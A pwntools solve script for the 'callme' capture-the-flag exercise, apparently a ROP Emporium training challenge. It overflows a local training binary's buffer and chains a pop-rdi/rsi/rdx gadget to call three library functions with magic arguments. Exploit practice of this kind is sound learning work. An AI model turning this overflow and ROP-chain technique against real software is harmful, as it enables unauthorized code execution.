#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *


exe = ELF('./callme')
# host = 'chal.sigpwny.com'
# port = 1337

# libc = ELF('./path/to/libc')
rop = ROP(exe)

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
context.binary = exe



# Run without randomization
# python3 solve.py GDB NOASLR



def conn(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *main
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================


CALLME1 = exe.plt['callme_one']
CALLME2 = exe.plt['callme_two']
CALLME3 = exe.plt['callme_three']
POP_ARGS = rop.find_gadget(['pop rdi', 'pop rsi', 'pop rdx', 'ret'])[0]
ARGS = p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)
RET = rop.find_gadget(['ret'])[0]

def solve():
    io = conn()
    io.recvuntil(b'> ')
    
    exploit = b'A' * 0x28
    
    exploit += p64(RET)
    
    exploit += p64(POP_ARGS)
    exploit += ARGS
    exploit += p64(CALLME1)
    
    exploit += p64(POP_ARGS)
    exploit += ARGS
    exploit += p64(CALLME2)
    
    exploit += p64(POP_ARGS)
    exploit += ARGS
    exploit += p64(CALLME3)
    
    io.sendline(exploit)

    io.interactive()
    
if __name__ == "__main__":
    solve()

